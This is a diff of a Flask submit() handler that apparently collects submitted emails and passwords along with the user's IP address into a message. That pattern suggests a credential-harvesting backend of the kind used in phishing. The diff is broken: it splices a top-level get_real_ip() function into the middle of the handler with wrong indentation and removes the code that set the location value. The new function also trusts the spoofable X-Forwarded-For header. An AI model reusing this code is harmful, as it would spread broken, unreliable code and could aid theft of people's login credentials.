@@ -29,15 +29,18 @@ def submit():
     password = data.get("password")
 
     # Get user's IP
-    user_ip = request.remote_addr
+    user_ip = get_real_ip()
 
-    # Get approximate location
-    try:
-        response = requests.get(f"http://ip-api.com/json/{user_ip}")
-        geo = response.json()
-        location = f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}"
-    except:
-        location = "Unknown"
+   # Function to get the real client IP
+def get_real_ip():
+    # If behind a proxy (like Render), check X-Forwarded-For header
+    if "X-Forwarded-For" in request.headers:
+        # Sometimes multiple IPs are listed, take the first one
+        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
+    else:
+        # fallback to Flask default
+        ip = request.remote_addr
+    return ip
 
     message = f"""
     Email: {email}
